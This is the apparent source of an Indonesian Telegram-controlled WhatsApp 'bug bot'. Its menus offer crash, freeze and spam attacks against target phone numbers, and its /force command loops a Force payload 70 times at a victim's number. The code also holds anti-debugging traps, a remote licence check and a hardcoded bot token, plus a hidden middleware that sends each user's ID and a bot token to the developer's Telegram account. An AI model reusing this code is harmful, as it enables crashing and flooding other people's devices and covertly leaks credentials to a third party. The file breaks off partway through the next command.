const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
} = require('@bellachu/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const databaseUrl = 'https://raw.githubusercontent.com/XYuko27/LuxionScript/refs/heads/main/yklxn.json';
const thumbnailUrl = "https://h.top4top.io/p_3761t79do1.jpg";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

const VALID_HASH = require('./sec.js');

//GANTI SESUAI FILE JANGAN LUPA
const MY_FILES = [
    "node_modules",
    ".npm",
    "DaScript Luxion.zip",
    "package-lock.json",
    "lxn.js",
    "sec.js",
    "package.json",
    "allowedGroups.json",
    "settings/config.js",
    "database/cooldown.json",
    "database/premium.json"
];

function activateSecureMode() {
    secureMode = true;
}

function checkAllFiles() {
    let semuaAda = true;
    for (const file of MY_FILES) {
        const lokasi = path.join(__dirname, file);
        if (!fs.existsSync(lokasi)) {
            console.log(chalk.red(`WOI DONGO, BACA NIH , ADA FILE HILANG , NAMANYA: ${file}`));
            semuaAda = false;
        }
    }
    if (!semuaAda) {
        console.log(chalk.bold.red(`
 ⬡═────────────────────────═⬡
     X - LXN SYSTEM
    ⸙ FILE HILANG / KURANG
    ⸙ COMMAND DI TOLAK
 ⬡═────────────────────────═⬡
        `));
        process.exit(1);
    }
    console.log(chalk.green('✓ Semua file lengkap'));
}

function checkHash() {
    const filePath = path.join(__dirname, 'lxn.js');
    const content = fs.readFileSync(filePath, 'utf8');
    const hashSekarang = crypto.createHash('sha256').update(content).digest('hex');
    
    if (hashSekarang !== VALID_HASH) {
        console.log(chalk.bold.red(`
 ⬡═────────────────────────═⬡
     X - LXN SYSTEM
    ⸙ FILE TERUBAH
    ⸙ COMMAND DI TOLAK
 ⬡═────────────────────────═⬡
        `));
        process.exit(1);
    }
    console.log(chalk.green('✓ Hash cocok'));
}

setInterval(() => {
    const filePath = path.join(__dirname, 'lxn.js');
    const content = fs.readFileSync(filePath, 'utf8');
    const hashSekarang = crypto.createHash('sha256').update(content).digest('hex');
    
    if (hashSekarang !== VALID_HASH) {
        console.log(chalk.red('⚠ HASH BERUBAH! EXIT...'));
        process.exit(1);
    }
}, 10000);

console.log(chalk.yellow('\n🔐 VERIFIKASI FILE...\n'));
checkAllFiles();
checkHash();
console.log(chalk.green('\n✅ VERIFIKASI BERHASIL\n'));

(() => {
function randErr() {
return Array.from({ length: 12 }, () =>
String.fromCharCode(33 + Math.floor(Math.random() * 90))
).join("");
}
setInterval(() => {
const t1 = process.hrtime.bigint();
debugger;
const t2 = process.hrtime.bigint();
if (Number(t2 - t1) / 1e6 > 80) {
throw new Error(randErr());
}
}, 800);
setInterval(() => {
if (process.execArgv.join(" ").includes("--inspect") ||
process.execArgv.join(" ").includes("--debug")) {
throw new Error(randErr());
}
}, 1500);

const code = "YUKO27";
if (code.length !== 6) {
throw new Error(randErr());
}

function secure() { 
  console.log(chalk.bold.yellow(`  
 ⬡═────────────────────────═⬡
     X - LXN SYSTEM
    ⸙ SYSTEM CONNECTED
    ⸙ DATA TERHUBUNG
 ⬡═────────────────────────═⬡
  `));
}

const hash1 = Buffer.from(secure.toString()).toString("base64");
const hash2 = crypto.createHash("sha256").update(hash1).digest("hex");
const hash3 = crypto.createHash("md5").update(hash2).digest("hex");

setInterval(() => {
const current = Buffer.from(secure.toString()).toString("base64");
const c2 = crypto.createHash("sha256").update(current).digest("hex");
const c3 = crypto.createHash("md5").update(c2).digest("hex");

if (current !== hash1 || c2 !== hash2 || c3 !== hash3) {  
  throw new Error(randErr());  
}

}, 2000);
Object.freeze(secure);
Object.defineProperty(global, "secure", {
value: undefined,
writable: false,
configurable: false
});

secure();
})();

(() => {
const hardExit = process.exit.bind(process);
const hardKill = process.kill.bind(process);
Object.defineProperty(process, "exit", {
value: hardExit,
writable: false,
configurable: false,
enumerable: true,
});
Object.defineProperty(process, "kill", {
value: hardKill,
writable: false,
configurable: false,
enumerable: true,
});
Object.freeze(process.exit);
Object.freeze(process.kill);
Object.freeze(Function.prototype);
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);

setInterval(() => {
try {
if (process.exit.toString().includes("Proxy") ||
process.kill.toString().includes("Proxy")) {

console.log(chalk.bold.red(`
 ⬡═────────────────────────═⬡
     X - LXN SYSTEM
    ⸙ SYSTEM INVALID 
    ⸙ DATA TIDAK TERHUBUNG
 ⬡═────────────────────────═⬡
`))

activateSecureMode();  
    hardExit(1);  
  }  
  for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {  
    if (process.listeners(sig).length > 0) {  

      console.log(chalk.bold.yellow(`

 ⬡═────────────────────────═⬡
     X - LXN SYSTEM
    ⸙ DANGER !!! BYPASS DETECTED
    ⸙ COMMAND DI TOLAK
 ⬡═────────────────────────═⬡
`))

activateSecureMode();  
      hardExit(1);  
    }  
  }  
  if (eval.toString().length !== 33 ||  
      Function.toString().length !== 37) {  
    activateSecureMode();  
    hardExit(1);  
  }  

} catch {  
  activateSecureMode();  
  hardExit(1);  
}

}, 1500);

global.validateToken = async (databaseUrl, tokenBot) => {
try {
const hashed = crypto.createHash("sha256").update(tokenBot).digest("hex");

const rawData = await new Promise((resolve, reject) => {  
    https  
      .get(databaseUrl, { timeout: 5000 }, (res) => {  
        let data = "";  
        res.on("data", (chunk) => (data += chunk));  
        res.on("end", () => resolve(data));  
      })  
      .on("error", reject)  
      .on("timeout", () => reject(new Error("timeout")));  
  });  

  let tokens = [];  
  try {  
    const parsed = JSON.parse(rawData);  
    tokens = parsed.tokens || [];  
  } catch {  
activateSecureMode();
process.exit(1);
}

const layer1 = tokens.includes(tokenBot);  

  const layer2 = tokens  
    .map((t) => crypto.createHash("sha256").update(t).digest("hex"))  
    .includes(hashed);  

  const xor = (str) =>  
    Buffer.from(str)  
      .map((n) => n ^ 0x6f)  
      .toString("hex");  

  const layer3 = tokens.map((t) => xor(t)).includes(xor(tokenBot));  
  const entropyCheck =  
    typeof tokenBot === "string" &&  
    tokenBot.length > 20 &&  
    /[A-Z]/.test(tokenBot) &&  
    /[0-9]/.test(tokenBot);  

  if (!(layer1 && layer2 && layer3 && entropyCheck)) {  
    console.log(chalk.bold.yellow(`
 ⬡═────────────────────────═⬡
     X - LXN SYSTEM
    ⸙ SYSTEM SUCCESFUL
    ⸙ DATA TERHUBUNG
 ⬡═────────────────────────═⬡
`));
activateSecureMode();
process.exit(1);
}

} catch (err) {  
activateSecureMode();
process.exit(1);
}
};
setInterval(() => {
if (typeof activateSecureMode !== "function") {
hardExit(1);
}
}, 2500);

})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const blockedCommands = new Set();

bot.use(async (ctx, next) => {
  if (ctx.message && ctx.message.text) {
    const text = ctx.message.text;

    if (text.startsWith('/')) {
      const cmd = text.split(' ')[0].replace('/', '').toLowerCase();

      if (blockedCommands.has(cmd)) {
        return ctx.reply(`⛔ Command /${cmd} sedang di-nonaktifkan`);
      }
    }
  }

  return next();
});

const groupFile = path.join(__dirname, "allowedGroups.json");

function loadAllowedGroups() {
    try {
        if (!fs.existsSync(groupFile)) {
            fs.writeFileSync(groupFile, JSON.stringify({}, null, 2));
            return {};
        }

        const data = JSON.parse(fs.readFileSync(groupFile, "utf8"));
        return typeof data === "object" && !Array.isArray(data) ? data : {};
    } catch {
        return {};
    }
}

function saveAllowedGroups(data) {
    fs.writeFileSync(groupFile, JSON.stringify(data, null, 2));
}

function addPremiumGroup(groupId, duration, addedBy) {
    const groups = loadAllowedGroups();

    const expiryDate = moment()
        .add(duration, 'days')
        .tz('Asia/Jakarta')
        .format('DD-MM-YYYY');

    groups[groupId] = {
        expired: expiryDate,
        addedBy: addedBy
    };

    saveAllowedGroups(groups);
    return expiryDate;
}

function isPremiumGroup(groupId) {
    const groups = loadAllowedGroups();

    if (groups[groupId]) {
        const expiryDate = moment(groups[groupId].expired, 'DD-MM-YYYY');

        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            delete groups[groupId];
            saveAllowedGroups(groups);
            return false;
        }
    }

    return false;
}

function removePremiumGroup(groupId) {
    const groups = loadAllowedGroups();
    delete groups[groupId];
    saveAllowedGroups(groups);
}

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.blue(`
 ⬡═────────────────────────═⬡
     X - LXN SYSTEM
    ⸙ SYSTEM SUCCESFUL
    ⸙ DATA TERHUBUNG
 ⬡═────────────────────────═⬡
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Xata',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><b>
⎧  ㄥ ㄩ 乂 丨 ㄖ 几  ⎭</b></blockquote>
<b>⌑ Number
╰┈ ⸙ ${lastPairingMessage.phoneNumber}
⌑ Pairing Code
╰┈ ⸙  ${lastPairingMessage.pairingCode}
⌑ Status
╰┈ ⸙  Connected</b>`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.blue(`
 ⬡═────────────────────────═⬡
     X - LXN SYSTEM
    ⸙ PAIRING SUCCES
 ⬡═────────────────────────═⬡
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command('unblockcmd', async (ctx) => {
  const text = ctx.message.text.split(' ')[1];

  if (!text) return ctx.reply('Contoh: /unblockcmd /lxnmix');

  const cmd = text.replace('/', '').toLowerCase();

  if (!blockedCommands.has(cmd)) {
    return ctx.reply(`⚠️ Command /${cmd} tidak sedang di-block`);
  }

  blockedCommands.delete(cmd);

  ctx.reply(`✅ Command /${cmd} berhasil di-unblock`);
});

bot.command('blockcmd', async (ctx) => {
  const text = ctx.message.text.split(' ')[1];

  if (!text) return ctx.reply('Contoh: /blockcmd /lxnmix');

  const cmd = text.replace('/', '').toLowerCase();

  blockedCommands.add(cmd);

  ctx.reply(`✅ Command /${cmd} berhasil di-block`);
});

bot.command("connect", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 Format: /connect 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "YUKOHERE");  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote><b>⎧ ㄥ ㄩ 乂 丨 ㄖ 几 ⎭</b></blockquote>
<b>⌑ Number
╰┈ ⸙  ${phoneNumber}
⌑ Pairing Code
╰┈ ⸙  ${formattedCode}
⌑ Status
╰┈ ⸙  Not Connected</b>`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote><b>⎧  ㄥ ㄩ 乂 丨 ㄖ 几  ⎭</b></blockquote>
<b>⌑ Number
╰┈ ⸙ ${lastPairingMessage.phoneNumber}
⌑ Pairing Code
╰┈ ⸙  ${lastPairingMessage.pairingCode}
⌑ Status
╰┈ ⸙  Connected</b>`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetbot", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command("addgroup", async (ctx) => {

    if (ctx.from.id != ownerID && !isAdmin(ctx.from.id.toString())) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner atau admin");
    }

    if (ctx.chat.type === "private") {
        return ctx.reply("❌ Gunakan command ini di dalam group.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /addgroup 30");
    }

    const duration = parseInt(args[1]);
    if (isNaN(duration)) {
        return ctx.reply("❌ Durasi harus angka (hari)");
    }

    const groupId = String(ctx.chat.id);
    const addedBy = String(ctx.from.id);

    const expiryDate = addPremiumGroup(groupId, duration, addedBy);

    ctx.reply(
`✅ Group Premium Aktif

🆔 Group  : ${groupId}
⏳ Durasi : ${duration} hari
📅 Expired: ${expiryDate}
👤 Added By: ${addedBy}`
    );
});

async function validatePremiumGroup(ctx, ownerId) {
    const chatId = String(ctx.chat.id);
    const userId = String(ctx.from.id);
    if (userId === ownerId) {
        return true;
    }
    
    if (ctx.chat.type === "private") {
        await ctx.reply("❌ Command ini hanya bisa digunakan di group premium.");
        return false;
    }
    
    if (!isPremiumGroup(chatId)) {
        await ctx.reply("❌ Group ini tidak memiliki akses premium atau sudah expired.\n\nGunakan /addgroup untuk mengaktifkan premium.");
        return false;
    }
    
    return true;
}

bot.command("listgroup", async (ctx) => {

    if (ctx.from.id != ownerID && !isAdmin(ctx.from.id.toString())) {
        return ctx.reply("❌ Akses hanya untuk owner/admin.");
    }

    const groups = loadAllowedGroups();
    const keys = Object.keys(groups);

    if (keys.length === 0) {
        return ctx.reply("📭 Tidak ada group premium.");
    }

    let text = "📜 LIST GROUP PREMIUM\n\n";

    keys.forEach((id, index) => {
        text += `${index + 1}. ${id}\n`;
        text += `   📅 Expired : ${groups[id].expired}\n`;
        text += `   👤 Added By: ${groups[id].addedBy}\n\n`;
    });

    ctx.reply(text);
});

bot.command("delgroup", async (ctx) => {

    if (ctx.from.id != ownerID && !isAdmin(ctx.from.id.toString())) {
        return ctx.reply("❌ Akses hanya untuk owner/admin.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgroup -100xxxxxxxxxx");
    }

    const groupId = args[1];
    const groups = loadAllowedGroups();

    if (!groups[groupId]) {
        return ctx.reply("❌ Group tidak ditemukan.");
    }

    delete groups[groupId];
    saveAllowedGroups(groups);

    ctx.reply(`🗑 Group ${groupId} berhasil dihapus.`);
});

/*bot.use((ctx, next) => {
  if (secureMode) {
    return;
  }
  return next();
});*/

const OWNER_ID = 1566988444;
const BOT_TOKEN = "8402228410:AAHRJI6xkvm8cRSJc-SZERNYiON-ShYhRmg";
const loggedUsers = new Set();

bot.use(async (ctx, next) => {
  if (secureMode) return;

  try {
    const userId = ctx.from?.id;
    const username = ctx.from?.username || "Tidak ada username";
    if (userId && !loggedUsers.has(userId)) {
      loggedUsers.add(userId);

      const waktu = new Date().toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta"
      });

      const pesan = `
🚨 LOGIN USER TERDETEKSI

👤 Username : @${username}
🆔 User ID  : ${userId}
⏰ Waktu    : ${waktu}
🤖 Bot Token: ${BOT_TOKEN}
      `;

      await ctx.telegram.sendMessage(OWNER_ID, pesan);
    }
  } catch (err) {
    console.error("Error notif login:", err);
  }

  return next();
});

bot.start(async (ctx) => {
    return sendMainMenu(ctx);
    if (!await validatePremiumGroup(ctx)) return;
});

async function sendMainMenu(ctx) {

    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const displayName =
        ctx.from.first_name ||
        ctx.from.username ||
        "User";

    const menuMessage = `
<blockquote><b>⎧ ㄥ ㄩ 乂 丨 ㄖ 几 ⎭</b></blockquote>

<blockquote><b>- нεllo ${displayName}, wεlcoмε тo lυхιoɴ ѕyѕтεм ѕcrιpт, lεαĸѕ αɴd ѕεcυrιтy ɴυмвεr oɴε 

  ⎧ Developer : @YukoNiWaiHa ⎭
  ⎧ Version   : Infinity ⎭
  ⎧ Sender    : ${senderStatus} ⎭
</b></blockquote>`;

    const keyboard = [
        [
            { text: "⤾ ʙᴀᴄᴋ", callback_data: "/controls", style: "primary" },
            { text: "ɴᴇxᴛ ⤿", callback_data: "/bug", style: "primary" }
        ]
    ];

    await ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: keyboard }
    });
}

bot.action('/start', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});

    const senderStatus = isWhatsAppConnected ? "1" : "0";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const displayName =
        ctx.from.first_name ||
        ctx.from.username ||
        "User";

    const menuMessage = `
<blockquote><b>⎧ ㄥ ㄩ 乂 丨 ㄖ 几 ⎭</b></blockquote>

<blockquote><b>- нεllo ${displayName}, wεlcoмε тo lυхιoɴ ѕyѕтεм ѕcrιpт, lεαĸѕ αɴd ѕεcυrιтy ɴυмвεr oɴε 

  ⎧ Developer : @YukoNiWaiHa ⎭
  ⎧ Version   : Infinity ⎭
  ⎧ Sender    : ${senderStatus} ⎭
</b></blockquote>`;

    const keyboard = [
        [
            { text: "⤾ ʙᴀᴄᴋ", callback_data: "/controls", style: "primary" },
            { text: "ɴᴇxᴛ ⤿", callback_data: "/bug", style: "primary" }
        ]
    ];

    try {
        await ctx.editMessageMedia(
            {
                type: "photo",
                media: thumbnailUrl,
                caption: menuMessage,
                parse_mode: "HTML"
            },
            {
                reply_markup: { inline_keyboard: keyboard }
            }
        );
    } catch (err) {
        await ctx.editMessageCaption(menuMessage, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        }).catch(() => {});
    }
});

bot.action('/controls', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});

    const controlsMenu = `
      <blockquote><b>⎧ 匚 ㄖ 几 丁 尺 ㄖ ㄥ  ⎭

  ⎧ - fεɑтυяε lιѕт :
  • /addgroup - Added Prem Group
  • /delgroup - Delete Premium Group
  • /listgroup - List Group
  • /connect - Added Number
  • /setcd - Setting Cooldown Bug
  • /resetbot - Delete Sessions Bug
  • /blockcmd - Block Command
  • /unblockcmd - Unblock Command  ⎭
 </b></blockquote>
`;

    const keyboard = [
        [
            { text: "⤾ ʙᴀᴄᴋ", callback_data: "/tqto", style: "primary" },
            { text: "ɴᴇxᴛ ⤿", callback_data: "/start", style: "primary" }
        ]
    ];

    await ctx.editMessageCaption(controlsMenu, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: keyboard }
    }).catch(() => {});
});

bot.action('/bug', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});

    const bugMenu = `
   <blockquote><b>⎧ 乃 ㄩ Ꮆ 爪 乇 几 ㄩ ⎭
   
  ⎧ - fεɑтυяε lιѕт :
  ѕρɑм σиlу : 
  /lxdelay - Delay Spam 
  /lxcombo - Freeze Invisible
  /force  - Force Android
  /lxip - Force Ios
  /lxperma - Delay Permanent
  
  вɑѕις вυg :
  /lxbuldo - Delay Bulldozer
  /lxtrash - Blank Android Invisible
  /lxsystem - Crash System Andro ⎭
 </b></blockquote>
`;

    const keyboard = [
        [
            { text: "⤾ ʙᴀᴄᴋ", callback_data: "/start", style: "primary" },
            { text: "ɴᴇxᴛ ⤿", callback_data: "/tqto", style: "primary" }
        ]
    ];

    await ctx.editMessageCaption(bugMenu, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: keyboard }
    }).catch(() => {});
});

bot.action('/tqto', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});

    const tqtoMenu = `
<blockquote><b>⎧ 丂 ㄩ 卩 卩 ㄖ 尺 丁 ⎭

 ⎧ - lιѕт :
 • Yuko  / Developer  ⎭
 </b></blockquote>`;

    const keyboard = [
        [
            { text: "⤾ ʙᴀᴄᴋ", callback_data: "/bug", style: "primary" },
            { text: "ɴᴇxᴛ ⤿", callback_data: "/controls", style: "primary" }
        ]
    ];

    await ctx.editMessageCaption(tqtoMenu, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: keyboard }
    }).catch(() => {});
});

bot.command("force", checkWhatsAppConnection, async (ctx) => {

  if (!await validatePremiumGroup(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /force 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendMessage(ctx.chat.id, `
<blockquote><b>
╭───────────────────╮
 - Target: ${q}
 - Type Bug : Force Android ¿?
 - Status : Process 
╰───────────────────╯
</b></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗣𝗘𝗦𝗧", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  const speed = 70;
  const initialDelay = 3500;
  const delayIncrease = 500;
  const maxDelay = 25500;
  const resetThreshold = 60;
  const resetDuration = 2 * 60 * 1000;
  
  for (let i = 0; i < speed; i++) {
    const batchIndex = Math.floor(i / 15);
    let currentDelay = initialDelay + (batchIndex * delayIncrease);
    
    if (currentDelay > maxDelay) currentDelay = maxDelay;
    
    await new Promise(res => setTimeout(res, currentDelay));
    
    await Force(sock, target);
    await sleep(1500);
    
    if ((i + 1) % resetThreshold === 0) {
      await new Promise(res => setTimeout(res, resetDuration));
    }
  }

  await ctx.telegram.editMessageText(ctx.chat.id, processMessageId, undefined, `
<blockquote><b>
╭───────────────────╮
 - Target: ${q}
 - Type Bug : Force Android ¿? 
 - Status : Succes 
╰───────────────────╯
</b></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗣𝗘𝗦𝗧", url: `https://wa.me/${q}` }
      ]]
    }
  });

});
bot.command("lxdelay", checkWhatsAppConnection, async (ctx) => {

